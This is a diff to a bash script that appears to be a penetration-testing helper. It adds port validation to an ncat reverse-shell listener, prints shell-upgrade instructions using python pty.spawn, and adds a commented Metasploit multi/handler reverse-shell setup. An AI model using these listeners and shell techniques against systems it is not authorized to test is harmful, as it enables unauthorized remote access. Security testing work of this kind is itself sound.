@@ -4,12 +4,17 @@ if [[ "$1" =~ ^l(isten)?$ ]]; then
   export INSTCMD="apt install ncat -y"
   checkCmd
 
-  if [ "$#" -eq 2 ] && [[ "$2" =~ ^[0-9]+$ ]]; then
-    PORT="$2"
-  else
-    PORT="9001"
+  PORT="9001"
+  if [ "$#" -eq 2 ]; then
+    if [[ "$2" =~ ^[0-9]+$ ]]; then
+      PORT="$2"
+    else
+      echo "${warn} Port is not a number!"; exit
+    fi
   fi
+
   CMD="$CMD -vlkp $PORT"
+
   # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
   echo "${info} Shell upgrade instructions:"
   echo "    python -c 'import pty;pty.spawn(\"/bin/bash\")'"
@@ -30,3 +35,12 @@ if [[ "$1" =~ ^l(isten)?$ ]]; then
   bash -c "$CMD"
   exit
 fi
+
+# 2DO:
+# - msf
+# msfconsole -x "use exploit/multi/handler;\
+# set PAYLOAD generic/shell_reverse_tcp;\
+# set LHOST $IP;\
+# set LPORT $PORT;\
+# run"
+# - socat
